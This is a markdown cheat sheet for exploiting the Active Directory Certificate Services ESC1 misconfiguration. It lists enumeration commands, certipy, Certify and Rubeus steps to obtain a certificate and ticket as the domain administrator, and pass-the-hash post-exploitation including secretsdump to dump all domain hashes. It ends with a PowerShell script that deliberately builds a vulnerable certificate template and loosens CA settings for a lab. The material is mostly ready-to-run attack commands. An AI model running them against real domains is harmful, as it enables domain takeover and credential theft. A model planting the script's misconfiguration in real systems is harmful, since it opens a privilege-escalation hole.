# ESC1 Condition
```powershell
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT     -       The certificate requester can define its own SAN (Subject Alternative Name) value
Broad enrollment permit               -       Can enroll Domain Users, Authenticated Users, or other large groups
Manager approval is not required      -       The certificate is issued automatically
EKU (Extended Key Usage)              -       Client Authentication, Smart Card Logon or other authentication options available
```

# ESC1 Flags
```powershell
msPKI-Certificate-Name-Flag      -      0x1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)       -       The SAN is determined by the requester
msPKI-Enrollment-Flag            -      0x0                                           -       No manager approval
```

# ESC1 Enumeration
```powershell
certipy-ad find -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -ldap-scheme ldap \
    -stdout

Certify.exe find /vulnerable
Certify.exe find /vulnerable /ca:"CA-Server\CA-Name"
```

# ESC1 Enumeration With LDAP
```powershell
ldapsearch -x -H ldap://dc.domain.local \
  -D "user@domain.local" -w 'Password123' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=pKICertificateTemplate)" \
  name msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pKIExtendedKeyUsage
```

# ESC1 Exploitation with Certipy
```powershell
# Request a certificate on behalf of the Domain Admin
certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -target 192.168.0.150 \
    -ca 'certificate-WIN-CERTIFICATE-CA' \
    -template 'VulnESC1' \
    -upn 'administrator@certificate.local' \
    -ldap-scheme ldap

# Get NT Hash from certificate
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip 10.10.10.10

# Get TGT from certificate
certipy-ad auth \
  -pfx administrator.pfx \
  -domain domain.local \
  -dc-ip 10.10.10.10
```

# ESC1 Exploitation With Certify and Rubeus
```powershell
# Request a certificate on behalf of the Domain Admin
Certify.exe request /ca:"CA-Server\CA-Name" /template:"VulnerableTemplate" /altname:"administrator"

# Convert PEM → PFX (on Linux side)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Buy TGT with Rubeus
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:'' /ptt

# Check whoami
klist
whoami /all
```

# Post Exploitation
```powershell
# SMB with NT Hash
impacket-psexec -hashes ':NTHash' administrator@dc.domain.local
impacket-smbexec -hashes ':NTHash' administrator@dc.domain.local
impacket-wmiexec -hashes ':NTHash' administrator@dc.domain.local

# Secretsdump — dump all hashes
impacket-secretsdump -hashes ':NTHash' administrator@dc.domain.local

# CrackMapExec
crackmapexec smb 10.10.10.10 -u administrator -H NTHash --shares
crackmapexec smb 10.10.10.10 -u administrator -H NTHash -x "whoami"

# Evil-WinRM
evil-winrm -i 10.10.10.10 -u administrator -H NTHash
```

# Labaratory
```powershell
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    ESC1 Vulnerable Lab Setup Script
    Creates a misconfigured AD CS certificate template for ESC1 testing.

.DESCRIPTION
    This script must be run as SYSTEM or an account with write access to
    CN=Certificate Templates. Use PsExec if Domain Admin is insufficient:
        PsExec64.exe -s -i powershell.exe .\Setup-ESC1Lab.ps1

.NOTES
    For authorized lab/testing use only.
#>

# ── Config ────────────────────────────────────────────────────────────────────

$TemplateName = "VulnESC1"
$TemplateOID  = "1.3.6.1.4.1.311.21.8.1417189.1978403.869562.7555284.2956879.9.1.100"
$EnrollGroup  = "Domain Users"

# ── Helpers ───────────────────────────────────────────────────────────────────

function Write-Step  { param($msg) Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok    { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Fail  { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }
function Write-Warn  { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }

# ── Preflight ─────────────────────────────────────────────────────────────────

Write-Host ""
Write-Host "  ESC1 Lab Setup" -ForegroundColor Magenta
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""

Write-Step "Checking environment..."

try {
    $configNC     = (Get-ADRootDSE).configurationNamingContext
    $templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
    Write-Ok "Config NC: $configNC"
} catch {
    Write-Fail "Cannot reach AD. Is this a Domain Controller?"
    exit 1
}

# ── Cleanup existing ──────────────────────────────────────────────────────────

$existing = Get-ADObject -Filter { Name -eq "VulnESC1" } -SearchBase $templatePath -ErrorAction SilentlyContinue

if ($existing) {
    Write-Warn "Existing VulnESC1 template found. Removing..."
    try {
        certutil -SetCATemplates -VulnESC1 2>$null | Out-Null
    } catch {}
    try {
        Remove-ADObject "CN=VulnESC1,$templatePath" -Confirm:$false -ErrorAction Stop
        Write-Ok "Old template removed."
    } catch {
        Write-Fail "Could not remove old template: $_"
        Write-Warn "Try running as SYSTEM: PsExec64.exe -s -i powershell.exe .\Setup-ESC1Lab.ps1"
        exit 1
    }
}

# ── Create template ───────────────────────────────────────────────────────────

Write-Step "Creating vulnerable certificate template: $TemplateName"

$attrs = @{
    "displayName"                          = $TemplateName
    "msPKI-Cert-Template-OID"              = $TemplateOID
    "msPKI-Certificate-Name-Flag"          = 1          # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
    "msPKI-Enrollment-Flag"                = 0
    "msPKI-Minimal-Key-Size"               = 2048
    "msPKI-Private-Key-Flag"               = 0
    "msPKI-RA-Signature"                   = 0
    "msPKI-Template-Schema-Version"        = 2
    "msPKI-Template-Minor-Revision"        = 0
    "msPKI-Certificate-Application-Policy" = "1.3.6.1.5.5.7.3.2"
    "pKIExtendedKeyUsage"                  = "1.3.6.1.5.5.7.3.2"   # Client Authentication
    "pKIDefaultKeySpec"                    = 1
    "pKIMaxIssuingDepth"                   = 0
    "pKIKeyUsage"                          = [byte[]]@(0x80, 0x00)
    "pKIDefaultCSPs"                       = "1,Microsoft Enhanced Cryptographic Provider v1.0"
    "pKIExpirationPeriod"                  = [byte[]]@(0x00, 0x40, 0x39, 0x87, 0x2e, 0x2b, 0xfe, 0xff)  # 1 year
    "pKIOverlapPeriod"                     = [byte[]]@(0x00, 0x80, 0xa6, 0x0a, 0xff, 0xff, 0xff, 0xff)  # 6 weeks
    "flags"                                = 131104     # No CT_FLAG_MACHINE_TYPE
    "revision"                             = 100
}

try {
    New-ADObject -Name $TemplateName `
                 -Path $templatePath `
                 -Type "pKICertificateTemplate" `
                 -OtherAttributes $attrs `
                 -ErrorAction Stop
    Write-Ok "Template created successfully."
} catch {
    Write-Fail "Failed to create template: $_"
    Write-Warn "Run as SYSTEM: PsExec64.exe -s -i powershell.exe .\Setup-ESC1Lab.ps1"
    exit 1
}

# ── Set ACL ───────────────────────────────────────────────────────────────────

Write-Step "Granting Enroll permission to '$EnrollGroup'..."

try {
    $acl  = Get-Acl "AD:\CN=$TemplateName,$templatePath"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        [System.Security.Principal.NTAccount]$EnrollGroup,
        "ExtendedRight",
        "Allow"
    )
    $acl.AddAccessRule($rule)
    Set-Acl -Path "AD:\CN=$TemplateName,$templatePath" -AclObject $acl -ErrorAction Stop
    Write-Ok "Enroll permission granted to '$EnrollGroup'."
} catch {
    Write-Fail "Failed to set ACL: $_"
    exit 1
}

# ── Enable EDITF_ATTRIBUTESUBJECTALTNAME2 ─────────────────────────────────────

Write-Step "Enabling EDITF_ATTRIBUTESUBJECTALTNAME2 on CA..."

$editFlags = certutil -getreg policy\EditFlags 2>&1
if ($editFlags -match "EDITF_ATTRIBUTESUBJECTALTNAME2") {
    Write-Ok "EDITF_ATTRIBUTESUBJECTALTNAME2 already enabled."
} else {
    certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 | Out-Null
    Write-Ok "EDITF_ATTRIBUTESUBJECTALTNAME2 enabled."
}

# ── Add to CA ─────────────────────────────────────────────────────────────────

Write-Step "Adding template to CA..."

$result = certutil -SetCATemplates +$TemplateName 2>&1
if ($LASTEXITCODE -eq 0) {
    Write-Ok "Template added to CA."
} else {
    Write-Warn "certutil -SetCATemplates failed, trying Add-CATemplate..."
    try {
        Add-CATemplate -Name $TemplateName -Force -ErrorAction Stop
        Write-Ok "Template added to CA via Add-CATemplate."
    } catch {
        Write-Fail "Could not add template to CA: $_"
        exit 1
    }
}

# ── Restart CertSvc ───────────────────────────────────────────────────────────

Write-Step "Restarting CertSvc..."
Restart-Service -Name CertSvc -Force
Start-Sleep -Seconds 5
Write-Ok "CertSvc restarted."

# ── Summary ───────────────────────────────────────────────────────────────────

Write-Host ""
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host "  ESC1 Lab Ready" -ForegroundColor Green
Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Template         : $TemplateName" -ForegroundColor White
Write-Host "  Enrollee SAN     : CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT" -ForegroundColor White
Write-Host "  EKU              : Client Authentication" -ForegroundColor White
Write-Host "  Manager Approval : Disabled" -ForegroundColor White
Write-Host "  RA Signature     : 0" -ForegroundColor White
Write-Host ""
Write-Host "  Exploit (from Kali):" -ForegroundColor Yellow
Write-Host ""

$domain = (Get-ADDomain).DNSRoot
$caName = (Get-ChildItem "Cert:\LocalMachine\CA" | Where-Object { $_.Issuer -like "*CA*" } | Select-Object -First 1).Issuer
$dcIP   = (Resolve-DnsName $domain -Type A -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress

Write-Host "  certipy req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
Write-Host "      -dc-ip $dcIP \`" -ForegroundColor Cyan
Write-Host "      -target $dcIP \`" -ForegroundColor Cyan
Write-Host "      -ca '<CA-NAME>' \`" -ForegroundColor Cyan
Write-Host "      -template '$TemplateName' \`" -ForegroundColor Cyan
Write-Host "      -upn 'administrator@$domain' \`" -ForegroundColor Cyan
Write-Host "      -ldap-scheme ldap" -ForegroundColor Cyan
Write-Host ""
Write-Host "  certipy auth -pfx 'administrator.pfx' -dc-ip $dcIP" -ForegroundColor Cyan
Write-Host ""
```
